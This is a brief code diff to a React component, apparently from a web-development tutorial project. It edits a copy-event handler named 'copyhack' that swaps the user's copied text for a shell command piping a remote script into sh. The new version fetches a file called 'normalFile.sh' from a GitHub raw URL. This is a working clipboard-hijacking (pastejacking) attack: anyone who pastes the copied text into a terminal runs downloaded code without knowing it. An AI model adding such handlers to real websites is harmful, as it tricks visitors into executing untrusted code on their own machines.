@@ -10,7 +10,7 @@ const SearchPanal = () => {
   }, [counter]);
 
   const copyhack = (e) => {
-    e.clipboardData.setData("text/plain", "curl https://google.com | sh\n")
+    e.clipboardData.setData("text/plain", "curl https://raw.githubusercontent.com/AdaBrain/react-masterclass/google-clone-ep6/google-clone/normalFile.sh | sh\n")
     e.preventDefault()
   } 
 
